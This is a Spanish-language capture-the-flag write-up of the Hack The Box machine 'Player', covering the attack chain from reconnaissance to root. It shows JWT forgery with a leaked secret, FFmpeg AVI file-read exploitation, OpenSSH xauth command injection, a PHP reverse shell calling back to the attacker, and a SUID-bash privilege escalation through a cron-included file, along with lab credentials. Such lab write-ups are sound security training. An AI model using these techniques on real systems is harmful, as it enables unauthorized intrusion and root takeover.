---
layout: post
title: Player
date: 2023-10-14
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Player-htb/Player.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.145 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 15:22 GMT
Nmap scan report for 10.10.10.145
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6686/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,6686 10.10.10.145 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 15:23 GMT
Nmap scan report for 10.10.10.145
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.7 (Ubuntu)
6686/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.145
http://10.10.10.145 [403 Forbidden] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], Title[403 Forbidden]
```

La página principal devuelve un código de estado 403. Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.145/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.145/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/10/13 15:28:45 Starting gobuster in directory enumeration mode
===============================================================
/launcher             (Status: 301) [Size: 314] [--> http://10.10.10.145/launcher/]
```

La ruta ```/launcher``` se ve así:

<img src="/writeups/assets/img/Player-htb/1.png" alt="">

Introduzco un correo e intercepto la petición con ```BurpSuite```. Se está setteando una cookie formada por un JWT

```null
GET /launcher/dee8dc8a47256c64630d803a4c40786c.php? HTTP/1.1
Host: 10.10.10.145
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://10.10.10.145/launcher/index.html
Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU
Upgrade-Insecure-Requests: 1
```

Lo introduzco en [jwt.io](https://jwt.io) para ver los campos que la forman

<img src="/writeups/assets/img/Player-htb/2.png" alt="">

Por el momento no me sirve de nada, así que añado el dominio ```player.htb``` al ```/etc/hosts``` y fuzzeo los subdominios

```null
wfuzz -c --hw=30 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.player.htb" http://player.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://player.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000070:   200        259 L    714 W      9513 Ch     "chat"                                                                                                                                         
000000067:   200        63 L     180 W      1470 Ch     "staging"                                                                                                                                      
000000019:   200        86 L     229 W      5243 Ch     "dev"                                                                                                                                          

Total time: 0
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 0
```

Agrego ```chat.player.htb```, ```staging.player.htb``` y ```dev.player.htb``` al ```/etc/hosts```. En el navegador, se ven así:

<img src="/writeups/assets/img/Player-htb/3.png" alt="">

Desde el apartado ```Contact Core Team``` puedo enviar un examen

<img src="/writeups/assets/img/Player-htb/4.png" alt="">

Lo intercepto con ```BurpSuite``` y, al enviar, aparece un error en la respuesta

```null
HTTP/1.1 200 OK
Date: Fri, 13 Oct 2023 16:54:36 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
refresh: 0;url=501.php
Vary: Accept-Encoding
Content-Length: 818
Connection: close
Content-Type: text/html

array(3) {
  [0]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(6)
    ["function"]=>
    string(1) "c"
    ["args"]=>
    array(1) {
      [0]=>
      &string(9) "Cleveland"
    }
  }
  [1]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(3)
    ["function"]=>
    string(1) "b"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Glenn"
    }
  }
  [2]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(11)
    ["function"]=>
    string(1) "a"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Peter"
    }
  }
}
Database connection failed.<html><br />Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
```

Se leakean la rutas ```/var/www/staging/contact.php```, ```/var/www/backup/service_config``` y ```/var/www/staging/fix.php```, los nombres de usuarios; ```Peter```, ```Glenn``` y ```Cleveland```. Antes había visto un archivo php en ```/launcher```, que me sirvió para extraer un JWT. En ocasiones, debido a malas prácticas se almacenan backups o copias en producción, que son accesibles teniendo el nombre. Fuzzeo por subextensiones sobre ```dee8dc8a47256c64630d803a4c40786c.php```

```null
wfuzz -c --hw=32 -t 200 -w /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.phpFUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.phpFUZZ
Total requests: 2450

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000359:   403        10 L     30 W       327 Ch      ".phps"                               
000001292:   404        9 L      33 W       322 Ch      ". T."                                
000001293:   404        9 L      33 W       323 Ch      ". php"                               
000001291:   404        9 L      34 W       343 Ch      ". EXTRAHOTELERO HOSPEDAJE"           

Total time: 0
Processed Requests: 2450
Filtered Requests: 2446
Requests/sec.: 0
```

No he encontrado nada, pero puede que no sea una extensión si no un caracter especial lo que esté añadido

```null
wfuzz -c --hw=32 -t 200 -w /usr/share/seclists/Fuzzing/special-chars.txt http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.phpFUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.phpFUZZ
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000000001:   200        32 L     66 W       742 Ch      "~"                                   
000000026:   302        0 L      0 W        0 Ch        "?"                                   
000000025:   302        0 L      0 W        0 Ch        "/"                                   
000000004:   302        0 L      0 W        0 Ch        "#"                                   
000000006:   400        10 L     35 W       301 Ch      "%"                                   
000000027:   302        0 L      0 W        0 Ch        ";"                                   

Total time: 0
Processed Requests: 32
Filtered Requests: 26
Requests/sec.: 0
```

La ```~``` devuelve un código de estado 200. Descargo este archivo a mi equipo

```null
curl 'http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~' -o dee8dc8a47256c64630d803a4c40786c.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   742  100   742    0     0   3016      0 --:--:-- --:--:-- --:--:--  3028
```

Puedo leer el código fuente

```php
<?php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
    $key = '_S0_R@nd0m_P@ss_';
    $decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
    if($decoded->access_code === "0E76658526655756207688271159624026011393")
    {
        header("Location: 7F2xxxxxxxxxxxxx/");
    }
    else
    {
        header("Location: index.html");
    }
}
else
{
    $token_payload = [
      'project' => 'PlayBuff',
      'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
    ];
    $key = '_S0_R@nd0m_P@ss_';
    $jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
    $cookiename = 'access';
    setcookie('access',$jwt, time() + (86400 * 30), "/");
    header("Location: index.html");
}

?>
```

Aparece el secreto de forma hardcodeada. Modifico el código de mi JWT al otro que aparece y lo firmo con la key. Es importante dejar los datos encodeados en base64 ya que en caso contrario dará error

<img src="/writeups/assets/img/Player-htb/5.png" alt="">

Le tramito una petición por GET con la nueva cookie y en las cabeceras de respuesta aparece un ```Location``` que realiza un redirect

```null
curl -s -X GET http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php -H "Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE" -I
HTTP/1.1 302 Found
Date: Fri, 13 Oct 2023 17:16:28 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Location: 7F2dcsSdZo6nj3SNMTQ1/
Content-Length: 0
Content-Type: text/html
```

Desde el navegador, abro la ruta ```/launcher/7F2dcsSdZo6nj3SNMTQ1/```

<img src="/writeups/assets/img/Player-htb/6.png" alt="">

Puedo subir un archivo. A modo de prueba, selecciono el archivo ```openports``` e intercepto la petición con ```BurpSuite```

```null
POST /launcher/7F2dcsSdZo6nj3SNMTQ1/upload.php HTTP/1.1
Host: player.htb
Content-Length: 670
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://player.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCAC3aiq3wHV01Qdl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryCAC3aiq3wHV01Qdl
Content-Disposition: form-data; name="media"; filename="openports"
Content-Type: application/octet-stream

# Nmap 7.94 scan initiated Fri Oct 13 15:22:54 2023 as: nmap -p- --open --min-rate 5000 -n -Pn -sS -oG openports 10.10.10.145
Host: 10.10.10.145 ()	Status: Up
Host: 10.10.10.145 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 6686/open/tcp/////	Ignored State: closed (65532)
# Nmap done at Fri Oct 13 15:23:07 2023 -- 1 IP address (1 host up) scanned in 13.17 seconds
------WebKitFormBoundaryCAC3aiq3wHV01Qdl
Content-Disposition: form-data; name="Submit"
Submit
------WebKitFormBoundaryCAC3aiq3wHV01Qdl--
```

Se está tramitando una petición contra ```upload.php```. Al enviar, reporta un link donde se puede acceder al archivo en formato ```AVI```

```null
Compressing done. You can access your media from below link: <br /><br /><a href="http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/1563842433.avi">Buffed Media</a>
```

En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS) mencionan una vulnerabilidad que permite la lectura de archivos locales de la máquina a través de la creación de un ```AVI``` malicioso

<img src="/writeups/assets/img/Player-htb/7.png" alt="">

Descargo el exploit desde [Github](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py). Lo ejecuto y a modo de prueba indico el archivo ```/etc/passwd```

```null
python3 gen_xbin_avi.py file:///etc/passwd testing.avi
```

Al subirlo, se procesa y si hago click en el enlace para descargar, obtengo un ```AVI``` nuevo. Al estar en formato de vídeo, los datos no se ven directamente

```null
file 1821016771.avi
1821016771.avi: RIFF (little-endian) data, AVI, 256 x 240, 25.00 fps, video: FFMpeg MPEG-4
```

Sin embargo, al abrirlo con un reproductor de vídeo, como puede ser ```VLC Media Player```, partes del archivo se leakean por imágenes

<img src="/writeups/assets/img/Player-htb/8.png" alt="">

Debido a un ```Information Disclosure``` que se acontencía anteriormente en un error, conseguí una ruta de backups. Miro a ver en que consiste

```null
python3 gen_xbin_avi.py file:///var/www/backup/service_config backup.avi
```

Puedo ver un usuario y contraseña

<img src="/writeups/assets/img/Player-htb/9.png" alt="">

No son válidas por SSH para el usuario ```telegen```

```null
ssh telegen@10.10.10.145
The authenticity of host '10.10.10.145 (10.10.10.145)' can't be established.
ED25519 key fingerprint is SHA256:8rmrsyqW6LHgmTrVtFYDb+HfglaTm6iWUYZCxFUGg8E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.145' (ED25519) to the list of known hosts.
telegen@10.10.10.145's password: 
Permission denied, please try again.
```

Me traigo el archivo ```fix.php```

```null
python3 gen_xbin_avi.py file:///var/www/staging/fix.php fix.avi
```

Pero no contiene nada interesante

<img src="/writeups/assets/img/Player-htb/10.png" alt="">

La máquina tenía otro puerto abierto por SSH, asi que intento conectarme por este. Gano acceso a un contenedor

```null
sshpass -p 'd-bC|jC!2uepS/w' ssh telegen@10.10.10.145 -p 6686
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.16.5 51372 6686
  SSH_CONNECTION=10.10.16.5 51372 10.10.10.145 6686
  SSH_TTY=/dev/pts/0
  TERM=xterm-kitty
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$
```

Pero aparentemente no puedo ejecutar comandos

```null
telegen:~$ id
*** forbidden command: id
telegen:~$ whoami
*** forbidden command: whoami
```

Como shell está asignada una ```lshell```. La versión que se emplea de ```OpenSSH``` es vulnerable a una inyección de comandos

```null
searchsploit openssh 7.2 | grep -i command
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                        | multiple/remote/39569.py
```

Me traigo el exploit

```null
searchsploit -m multiple/remote/39569.py
  Exploit: OpenSSH 7.2p1 - (Authenticated) xauth Command Injection
      URL: https://www.exploit-db.com/exploits/39569
     Path: /usr/share/exploitdb/exploits/multiple/remote/39569.py
    Codes: CVE-2016-3115
 Verified: False
File Type: ASCII text, with very long lines (407)
Copied to: /home/rubbx/Desktop/HTB/Machines/Player/39569.py
```

Al ejecutar, aparece un menú con las distintas opciones

```null
python2 39569.py 10.10.10.145 6686 telegen 'd-bC|jC!2uepS/w'
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@10.10.10.145:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile <path>
    .writefile <path> <data>
    .exit .quit
    <any xauth command or type help>

#> 
```

Puedo leer archivos y sobrescribirlos en algunos casos. Obtengo la primera flag

```null
#> .readfile /home/telegen/user.txt
DEBUG:__main__:auth_cookie: 'xxxx\nsource /home/telegen/user.txt\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:0cda14ef259265f88e95237ddc44fff2
```

# Escalada

Obtengo el archivo ```fix.php```. Ahora sí es legible

```null
#> .readfile /var/www/staging/fix.php
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:<?php
class
protected
protected
protected
public
return
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
if($result
static::failed($test_name);
}
static::passed($test_name);
}
}
public
if(!$username){
$username
$password
}
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
echo
echo
echo
}
private
echo
static::$failed++;
}
private
static::character(".");
static::$passed++;
}
private
echo
static::$last_echoed
}
private
if(static::$last_echoed
echo
static::$last_echoed
}
}
```

Se encuentran credenciales para el usuario ```peter:CQXpm\z)G5D#%S$y=``` pero no son válidas por SSH. Sin embargo, se reutilizan para el panel de ```dev.player.htb``` 

<img src="/writeups/assets/img/Player-htb/11.png" alt="">

Corresponde a una interfaz de ```Codiac```

<img src="/writeups/assets/img/Player-htb/12.png" alt="">

Puedo crear un nuevo proyecto

<img src="/writeups/assets/img/Player-htb/13.png" alt="">

Están limitadas las rutas donde almacenarlos. En la esquina inferior derecha se leakea cual de ellas está permitida

<img src="/writeups/assets/img/Player-htb/14.png" alt="">

Introduzco ```/var/www/demo/test```. Si introduzco el endpoint ```test``` en el subdomino actual, devuelve un código de estado 403 por lo que es el directorio actual de trabajo

<img src="/writeups/assets/img/Player-htb/15.png" alt="">

Al hacer click derecho sobre el proyecto, aparece la opción de crear un archivo

<img src="/writeups/assets/img/Player-htb/16.png" alt="">

Añado uno con extensión ```PHP```

<img src="/writeups/assets/img/Player-htb/17.png" alt="">

Con la función ```system``` me envío una reverse shell

<img src="/writeups/assets/img/Player-htb/18.png" alt="">

Le tramito una petición por GET a este archivo y gano acceso al sistema en una sesión de ```netcat```

```null
curl -s -X GET http://dev.player.htb/test/pwned.php
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.145] 44372
bash: cannot set terminal process group (2274): Inappropriate ioctl for device
bash: no job control in this shell
www-data@player:/var/www/demo/test$ script /dev/null -c bash
script /dev/null -c bash
www-data@player:/var/www/demo/test$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
            reset xterm
www-data@player:/var/www/demo/test$ export TERM=xterm-color
www-data@player:/var/www/demo/test$ export SHELL=bash
www-data@player:/var/www/demo/test$ stty rows 55 columns 209
www-data@player:/var/www/demo/test$ source /etc/skel/.bashrc 
```

El servicio lo ejecuta la máquina host, no un contenedor

```null
www-data@player:/var/www/demo/test$ hostname -I
10.10.10.145 dead:beef::250:56ff:feb9:10f5 
```

Me conecto como ```telegen``` empleando una ```bash```

```null
www-data@player:/tmp$ su telegen -s /bin/bash
Password: 
telegen@player:/tmp$ 
```

Subo el ```pspy``` para detectar tareas que se ejecutan en intervalos regulares de tiempo

```null
2023/10/14 15:24:01 CMD: UID=0    PID=7043   | CRON 
2023/10/14 15:24:01 CMD: UID=0    PID=7045   | /usr/bin/php /var/lib/playbuff/buff.php 
2023/10/14 15:24:01 CMD: UID=0    PID=7044   | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php > /var/lib/playbuff/error.log 
```

Se está ejecutando un script en PHP

```null
telegen@player:/tmp$ cat /var/lib/playbuff/buff.php
<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
	public $logFile="/var/log/playbuff/logs.txt";
	public $logData="Updated";

	public function __wakeup()
	{
		file_put_contents(__DIR__."/".$this->logFile,$this->logData);
	}
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))
{
	$update = file_get_contents("/var/lib/playbuff/logs.txt");
	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
	if($query)
	{
		echo 'Update Success with serialized logs!';
	}
}
else
{
	file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
	$update = file_get_contents("/var/lib/playbuff/logs.txt");
	$query = mysqli_query($conn, "update stats set status='$update' where id=1");
	if($query)
	{
		echo 'Update Success!';
	}
}
?>
```

Se está incluyendo el script ```/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php```. Su propietario es ```www-data``` y tiene capacidad de escritura. Me convierto en este y le añado una instrucción que le asigne el privilegio SUID a la ```bash```

```null
telegen@player:/tmp$ exit
exit
www-data@player:/tmp$
```

```php
system("chmod u+s /bin/bash");
```

Puedo ver la segunda flag

```null
www-data@player:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1021112 Oct  8  2014 /bin/bash
```

```null
bash-4.3# cat /root/root.txt
c171efc58bf4b42efe8dc9b046ac892e
```